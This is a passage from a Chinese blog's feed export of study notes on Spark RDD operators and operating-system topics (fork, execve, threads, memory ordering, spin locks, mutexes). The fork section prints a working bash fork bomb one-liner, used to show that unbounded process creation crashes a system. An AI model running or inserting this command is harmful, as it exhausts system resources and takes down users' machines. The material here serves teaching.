sc.parallelize(1 to 4, 2)</p><p>scala&gt; val b = a.flatMap(x =&gt; 1 to x)</p><p>scala&gt; b.collect</p><p>res12: Array[Int] = Array(1, 1, 2, 1, 2, 3, 1, 2, 3, 4,1,2,3,4)</p><h4 id="mapWith"><a class="header-anchor" href="#mapWith">¶</a>mapWith</h4><p>是map的一个变种，map只需要一个输入函数，而mapWith有两个输入函数。它的定义如下：</p><p><code>def mapWith[A: ClassTag, U: ](constructA: Int =&gt; A, preservesPartitioning: Boolean = false)(f: (T, A) =&gt; U): RDD[U]</code></p><p>第一个函数constructA是把RDD的partition index（index从0开始）作为输入，输出为新类型A；</p><p>第二个函数f是把二元组(T, A)作为输入（其中T为原RDD中的元素，A为第一个函数的输出），输出类型为U。</p><p>举例：把partition index 乘以10，然后加上2作为新的RDD的元素。</p><p>val x = sc.parallelize(List(1,2,3,4,5,6,7,8,9,10), 3)</p><p>x.mapWith(a =&gt; a * 10)((a, b) =&gt; (b + 2)).collect</p><p>res4: Array[Int] = Array(2, 2, 2, 12, 12, 12, 22, 22, 22, 22)</p><h4 id="union，"><a class="header-anchor" href="#union，">¶</a>union，++</h4><p>将两个RDD中元素直接作为新RDD的元素</p><p>1,2,3++4,5,6：1,2,3,4,5,6</p><p>对比<code>zip</code>：将两个RDD元素两两组合成tuple，作为新RDD的元素</p><p>1,2,3 zip 4,5,6：(1,4),(2,5)(3,6)</p><h3 id="4-部分action算子"><a class="header-anchor" href="#4-部分action算子">¶</a>4.部分action算子</h3><h4 id="collect"><a class="header-anchor" href="#collect">¶</a>collect</h4><p>将数据集的所有元素作为驱动程序中的数组返回，在返回足够小的数据子集的过滤器或其他操作时很有用</p><h4 id="foreach-func"><a class="header-anchor" href="#foreach-func">¶</a>foreach(func)</h4><p>在数据集的每个元素上运行函数func</p>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BigData </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jyyOS-3</title>
      <link href="/2022/09/10/jyyOS-3/"/>
      <url>/2022/09/10/jyyOS-3/</url>
      
        <content type="html"><![CDATA[<h2 id="Linux-操作系统启动流程"><a class="header-anchor" href="#Linux-操作系统启动流程">¶</a>Linux 操作系统启动流程</h2><p>CPU Reset → Firmware → Loader → Kernel <code>_start()</code> → 第一个程序 <code>/bin/init</code> → 程序 (状态机) 执行 + 系统调用syscal</p><p>操作系统会加载 “第一个程序”</p><ul><li>RTFSC(latest Linux Kernel)<ul><li>如果没有指定启动选项 <code>init=</code>，按照 “默认列表” 尝试一遍</li><li>从此以后，Linux Kernel 就进入后台，成为 “中断/异常处理程序”</li></ul></li></ul><h3 id="操作系统为-所有-程序提供-API"><a class="header-anchor" href="#操作系统为-所有-程序提供-API">¶</a>操作系统为 (所有) 程序提供 API</h3><ul><li>进程 (状态机) 管理<ul><li>fork, execve, exit - 状态机的创建/改变/删除 ← 今天的主题</li></ul></li><li>存储 (地址空间) 管理<ul><li>mmap - 虚拟地址空间管理</li></ul></li><li>文件 (数据对象) 管理<ul><li>open, close, read, write - 文件访问管理</li><li>mkdir, link, unlink - 目录管理</li></ul></li></ul><h1>进程（状态机）管理</h1><p>虚拟化：操作系统在物理内存中保存多个状态机</p><ul><li>通过虚拟内存实现每次 “拿出来一个执行”</li><li>中断后进入操作系统代码，“换一个执行”</li></ul><h2 id="创建状态机：fork"><a class="header-anchor" href="#创建状态机：fork">¶</a>创建状态机：fork</h2><p><code>int fork();</code></p><ul><li>立即复制状态机 (完整的内存)</li><li>新创建进程返回 0</li><li>执行 fork 的进程返回子进程的进程号</li></ul><h3 id="Fork-Bomb"><a class="header-anchor" href="#Fork-Bomb">¶</a>Fork Bomb</h3><p>模拟状态机需要资源——只要不停地创建进程，系统还是会挂掉的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">:()&#123;:|:&amp;&#125;;:   <span class="comment"># 刚才的一行版本</span></span><br><span class="line"></span><br><span class="line">:() &#123;         <span class="comment"># 格式化一下</span></span><br><span class="line">  : | : &amp;</span><br><span class="line">&#125;; :</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">fork</span></span>() &#123;      <span class="comment"># bash: 允许冒号作为标识符……</span></span><br><span class="line">  fork | fork &amp;</span><br><span class="line">&#125;; fork</span><br></pre></td></tr></table></figure><h3 id="例子"><a class="header-anchor" href="#例子">¶</a>例子</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> n = <span class="number">2</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    fork();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hello\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">    wait(<span class="literal">NULL</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>./a.out</code> v.s. <code>./a.out | cat</code>，会看到结果并不相同</p><p>原因：printf在终端输出时，会先存在LineBuffer，直到遇到\n等。输出至文件时，会存在FullBuffer，满一定额输出。fork时缓存也被复制了。</p><ul><li><p>i=0，fork</p></li><li><p>i=0，printf ×2</p></li><li><p>i=1，fork    Hello\n ×2</p></li><li><p>i=1，printf    Hello\n ×4</p></li><li><p>i=2，结束    Hello\nHello\n ×4</p></li></ul><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc = fork();</span><br><span class="line">  <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>); <span class="comment">//这些用于检测异常情况</span></span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (rc==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;this is child process\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">printf</span>(<span class="string">&quot;this is parent process\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​ 如果在单CPU的系统上运行上面这段程序，程序所输出的结果是不确定的，有可能先输出 this is parent process，也有可能先输出 this is child process，因为在 int rc = fork(); 这行代码执行完之后，父进程和新创建的子进程就是操作系统当中<strong>并发的两个不同的进程</strong>了，他们两个谁先运行并输出信息就要取决于CPU调度程序了。</p><h3 id="wait-系统调用"><a class="header-anchor" href="#wait-系统调用">¶</a>wait()系统调用</h3><p>​ 父进程在使用fork()创建完子进程之后，可以执行wait()系统调用，或者是更完整的waitpid()接口，从而延迟自己的执行，直到子进程执行完，如果将上面fork()系统调用中的举例使用的代码进行部分修改，改为下面这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> rc = fork();</span><br><span class="line">  <span class="keyword">if</span>(rc&lt;<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">&quot;fork failed\n&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (rc==<span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;this is child process\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">int</span> wc = wait(<span class="literal">NULL</span>);  <span class="comment">//这一句代码是新添加的，父进程通过wait()等待子进程结束之后自己才继续执行</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this is parent process\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>这样，输出的结果就总是 this is child process 这句话先输出了，哪怕调度算法让父进程先于子进程执行，父进程执行到wait()处时，便会停止执行，开始等待，直至子进程运行结束。</p><h2 id="替换状态机：execve"><a class="header-anchor" href="#替换状态机：execve">¶</a>替换状态机：execve</h2><p>将当前运行的状态机重置成成另一个程序的初始状态</p><p><code>int execve(const char *filename, char * const argv, char * const envp);</code></p><ul><li>执行名为 <code>filename</code> 的程序</li><li>允许对新状态机设置参数 <code>argv</code> (v) 和环境变量 <code>envp</code> (e)</li></ul><h3 id="环境变量"><a class="header-anchor" href="#环境变量">¶</a>环境变量</h3><p>“应用程序执行的环境”</p><ul><li>使用 <code>env</code> 命令查看<ul><li><code>PATH</code>: 可执行文件搜索路径</li><li><code>PWD</code>: 当前路径</li><li><code>HOME</code>: home 目录</li><li><code>DISPLAY</code>: 图形输出</li><li><code>PS1</code>: shell 的提示符</li></ul></li><li><code>export</code>: 告诉 shell 在创建子进程时设置环境变量</li></ul><h2 id="终止状态机：-exit"><a class="header-anchor" href="#终止状态机：-exit">¶</a>终止状态机：_exit</h2><p>立即摧毁状态机，<code>void _exit(int status)</code></p><p>销毁当前状态机，并允许有一个返回值</p><h3 id="结束程序执行的三种方法"><a class="header-anchor" href="#结束程序执行的三种方法">¶</a>结束程序执行的三种方法</h3><p>exit 的几种写法 (它们是不同)</p><ul><li><code>exit(0)</code> - <code>stdlib.h</code> 中声明的 libc 函数<ul><li>会调用 <code>atexit</code></li></ul></li><li><code>_exit(0)</code> - glibc 的 syscall wrapper<ul><li>执行 “<code>exit_group</code>” 系统调用终止整个进程 (所有线程)<ul><li>细心的同学已经在 strace 中发现了</li></ul></li><li>不会调用 <code>atexit</code></li></ul></li><li><code>syscall(SYS_exit, 0)</code><ul><li>执行 “<code>exit</code>” 系统调用终止当前线程</li><li>不会调用 <code>atexit</code></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> OS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jyyOS-2</title>
      <link href="/2022/09/08/jyyOS-2/"/>
      <url>/2022/09/08/jyyOS-2/</url>
      
        <content type="html"><![CDATA[<h2 id="并发的基本单位：线程"><a class="header-anchor" href="#并发的基本单位：线程">¶</a>并发的基本单位：线程</h2><p>共享内存的多个执行流</p><ul><li>执行流拥有独立的堆栈/寄存器</li><li>共享全部的内存 (指针可以互相引用)</li></ul><h1>入门：<code>thread.h</code> 简化的线程 API</h1><ul><li><code>create(fn)</code><ul><li>创建一个入口函数是 <code>fn</code> 的线程，并立即开始执行<ul><li><code>void fn(int tid) &#123; ... &#125;</code></li><li>参数 <code>tid</code> 从 1 开始编号</li></ul></li><li>语义：在状态中新增 stack frame 列表并初始化为 <code>fn(tid)</code></li></ul></li><li><code>join()</code><ul><li>等待所有运行线程的 <code>fn</code> 返回</li><li>在 <code>main</code> 返回时会自动等待所有线程结束</li><li>语义：在有其他线程未执行完时死循环，否则返回</li></ul></li><li>编译时需要增加 <code>-lpthread</code></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NTHREAD 64</span></span><br><span class="line"><span class="class"><span class="keyword">enum</span> &#123;</span> T_FREE = <span class="number">0</span>, T_LIVE, T_DEAD, &#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> &#123;</span></span><br><span class="line">  <span class="keyword">int</span> id, status;</span><br><span class="line">  <span class="keyword">pthread_t</span> thread;</span><br><span class="line">  <span class="keyword">void</span> (*entry)(<span class="keyword">int</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">thread</span> <span class="title">tpool</span>[<span class="title">NTHREAD</span>], *<span class="title">tptr</span> =</span> tpool;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">wrapper</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">thread</span> =</span> (struct thread *)arg;</span><br><span class="line">  thread-&gt;entry(thread-&gt;id);</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">void</span> *fn)</span> </span>&#123;</span><br><span class="line">  assert(tptr - tpool &lt; NTHREAD);</span><br><span class="line">  *tptr = (struct thread) &#123;</span><br><span class="line">    .id = tptr - tpool + <span class="number">1</span>,</span><br><span class="line">    .status = T_LIVE,</span><br><span class="line">    .entry = fn,</span><br><span class="line">  &#125;;</span><br><span class="line">  pthread_create(&amp;(tptr-&gt;thread), <span class="literal">NULL</span>, wrapper, tptr);</span><br><span class="line">  ++tptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">join</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NTHREAD; i++) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">thread</span> *<span class="title">t</span> =</span> &amp;tpool[i];</span><br><span class="line">    <span class="keyword">if</span> (t-&gt;status == T_LIVE) &#123;</span><br><span class="line">      pthread_join(t-&gt;thread, <span class="literal">NULL</span>);</span><br><span class="line">      t-&gt;status = T_DEAD;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__attribute__((destructor)) <span class="function"><span class="keyword">void</span> <span class="title">cleanup</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  join();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>放弃</h1><h2 id="1-原子性"><a class="header-anchor" href="#1-原子性">¶</a>1. 原子性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100000000</span></span><br><span class="line"><span class="keyword">long</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Tsum</span><span class="params">()</span> </span>&#123; <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; N; i++) sum++; &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  create(Tsum);</span><br><span class="line">  create(Tsum);</span><br><span class="line">  join();</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;sum = %ld\n&quot;</span>, sum);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>“程序 (甚至是一条指令) 独占处理器执行” 的基本假设在现代多处理器系统上不再成立。</strong></p><p>原子性：一段代码执行 (例如 <code>pay()</code>) 独占整个计算机系统</p><ul><li>单处理器多线程<ul><li>线程在运行时可能被中断，切换到另一个线程执行</li></ul></li><li>多处理器多线程<ul><li>线程根本就是并行执行的</li></ul></li></ul><h2 id="2-顺序"><a class="header-anchor" href="#2-顺序">¶</a>2. 顺序</h2><p>给sum添加编译优化？</p><ul><li><code>-O1</code>: 100000000 😱😱</li><li><code>-O2</code>: 200000000 😱😱😱</li></ul><p>不同编译优化对并发的处理不同，O1可能是分别写入各自求和的结果</p><p><strong>编译器对内存访问 “eventually consistent” 的处理导致共享内存作为线程同步工具的失效。</strong></p><h2 id="3-可见性"><a class="header-anchor" href="#3-可见性">¶</a>3. 可见性</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> x = <span class="number">0</span>, y = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T1</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  x = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> : : <span class="string">&quot;memory&quot;</span>)</span></span>; <span class="comment">// compiler barrier</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;y = %d\n&quot;</span>, y);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">T2</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  y = <span class="number">1</span>;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span><span class="params">(<span class="string">&quot;&quot;</span> : : <span class="string">&quot;memory&quot;</span>)</span></span>; <span class="comment">// compiler barrier</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;x = %d\n&quot;</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Tip：输出不好读？pipe to head -n 1000000 | sort | uniq -c</span></span><br></pre></td></tr></table></figure><p>出现了状态机推理之外的结果：0 0</p><p>现代处理器也是（动态）编译器，把汇编变为微指令μops，每个μop都有Fetch, Issue, Execute, Commit 四个阶段。</p><p><strong>满足单处理器 eventual memory consistency 的执行，在多处理器上可能无法序列化！</strong></p><p>导致可见性的丧失</p><h1>互斥</h1><h2 id="一个互斥算法——Peterson-算法"><a class="header-anchor" href="#一个互斥算法——Peterson-算法">¶</a>一个互斥算法——Peterson 算法</h2><p>互斥：保证两个线程不能同时执行一段代码。</p><h3 id="举例"><a class="header-anchor" href="#举例">¶</a>举例</h3><p>A 和 B 争用厕所的包厢</p><ol><li><p>想进入包厢之前，A/B 都要先举起自己的旗子</p></li><li><p>A 确认旗子举好以后，往厕所门上贴上 “B 正在使用” 的标签</p><p>B 确认旗子举好以后，往厕所门上贴上 “A 正在使用” 的标签</p></li><li><p>然后，如果对方的旗子举起来，且门上的名字不是自己，等待</p><p>否则可以进入包厢</p></li><li><p>出包厢后，放下自己的旗子</p></li></ol><ul><li>如果只有一个人举旗，他就可以直接进入</li><li>如果两个人同时举旗，由厕所门上的标签决定谁进<ul><li>手快有 (被另一个人的标签覆盖)、手慢无</li></ul></li></ul><h2 id="硬件提供原子指令"><a class="header-anchor" href="#硬件提供原子指令">¶</a>硬件提供原子指令</h2><p>例：Atomic exchange (load + store)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xchg</span><span class="params">(<span class="keyword">volatile</span> <span class="keyword">int</span> *addr, <span class="keyword">int</span> newval)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result;</span><br><span class="line">  <span class="function"><span class="keyword">asm</span> <span class="title">volatile</span> <span class="params">(<span class="string">&quot;lock xchg %0, %1&quot;</span></span></span></span><br><span class="line"><span class="params"><span class="function">    : <span class="string">&quot;+m&quot;</span>(*addr), <span class="string">&quot;=a&quot;</span>(result) : <span class="string">&quot;1&quot;</span>(newval))</span></span>;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>原子指令的模型</p><ul><li>保证之前的 store 都写入内存</li><li>保证 load/store 不与原子指令乱序</li></ul><h2 id="自旋锁"><a class="header-anchor" href="#自旋锁">¶</a>自旋锁</h2><h3 id="用-xchg-实现互斥"><a class="header-anchor" href="#用-xchg-实现互斥">¶</a>用 <code>xchg</code> 实现互斥</h3><p>如何协调宿舍若干位同学上厕所问题？</p><ul><li>在厕所门口放一个桌子 (共享变量)<ul><li>初始时，桌上是 🔑</li></ul></li><li>每个人可以完成原子操作<ul><li>拿一个任意东西与🔑交换（xchg）</li></ul></li></ul><p>实现互斥的协议</p><ul><li>想上厕所的同学 (一条 xchg 指令)<ul><li>天黑请闭眼</li><li>试图知道桌子上有什么 (🔑 或 🔞)</li><li>把 🔞 放到桌上 (覆盖之前有的任何东西)</li><li>天亮请睁眼；看到 🔑 才可以进厕所哦</li></ul></li><li>出厕所的同学<ul><li>把 🔑 放到桌上</li></ul></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> table = YES;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">retry:</span><br><span class="line">  <span class="keyword">int</span> got = xchg(&amp;table, NOPE);</span><br><span class="line">  <span class="keyword">if</span> (got == NOPE)</span><br><span class="line">    <span class="keyword">goto</span> retry;</span><br><span class="line">  assert(got == YES);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  xchg(&amp;table, YES)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 简洁版</span></span><br><span class="line"><span class="keyword">int</span> locked = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">lock</span><span class="params">()</span> </span>&#123; <span class="keyword">while</span> (xchg(&amp;locked, <span class="number">1</span>)) ; &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unlock</span><span class="params">()</span> </span>&#123; xchg(&amp;locked, <span class="number">0</span>); &#125;</span><br></pre></td></tr></table></figure><h3 id="Load-Reserved-Store-Conditional-LR-SC"><a class="header-anchor" href="#Load-Reserved-Store-Conditional-LR-SC">¶</a>Load-Reserved/Store-Conditional (LR/SC)</h3><p>LR: 在内存上标记 reserved (盯上你了)，中断、其他处理器写入都会导致标记消除</p><p>SC: 如果 “盯上” 未被解除，则写入</p><h3 id="自旋锁的缺陷"><a class="header-anchor" href="#自旋锁的缺陷">¶</a>自旋锁的缺陷</h3><p>因为自旋锁的存在使得临界区的代码只能被串行执行，拿不到所的线程只能在CPU上空转，所以程序的性能受到了不小的影响，因此自旋锁一般用于管理比较短的临界区</p><p>即：</p><ol><li><p>自旋 (共享变量) 会触发处理器间的缓存同步，延迟增加</p></li><li><ul><li>除了进入临界区的线程，其他处理器上的线程都在空转</li><li>争抢锁的处理器越多，利用率越低</li></ul></li><li><p>获得自旋锁的线程可能被操作系统切换出去，100%资源浪费</p></li></ol><h3 id="自旋锁的使用场景"><a class="header-anchor" href="#自旋锁的使用场景">¶</a>自旋锁的使用场景</h3><ul><li>临界区几乎不 “拥堵”</li><li>持有自旋锁时禁止执行流切换</li></ul><p>使用场景：操作系统内核的并发数据结构 (短临界区)</p><h2 id="mutex（互斥锁-睡眠锁）"><a class="header-anchor" href="#mutex（互斥锁-睡眠锁）">¶</a>mutex（互斥锁/睡眠锁）</h2><p>因此，我们要改进自旋锁的性能，从“程序就是状态机”的视角来看，拿不到自旋锁的线程所对应的状态机只会不可避免的一遍一遍地执行<code>xchg</code>指令，那我们不妨想办法修改它的状态机，让它在第一次尝试获得锁失败后就立刻执行<code>syscall</code>指令，陷入内核，让拥有高特权级的操作系统内核把其他线程换上CPU运行，就好像这个线程已经用完了它的时间片。这样的话，既不会改变状态机原有的状态，也把CPU资源留给了有用的计算。</p><ul><li><code>syscall(SYSCALL_lock, &amp;lk);</code><ul><li>试图获得 <code>lk</code>，但如果失败，就切换到其他线程</li></ul></li><li><code>syscall(SYSCALL_unlock, &amp;lk);</code><ul><li>释放 <code>lk</code>，如果有等待锁的线程就唤醒</li></ul></li></ul><p>举例：操作系统 = 更衣室管理员</p><ul><li>先到的人 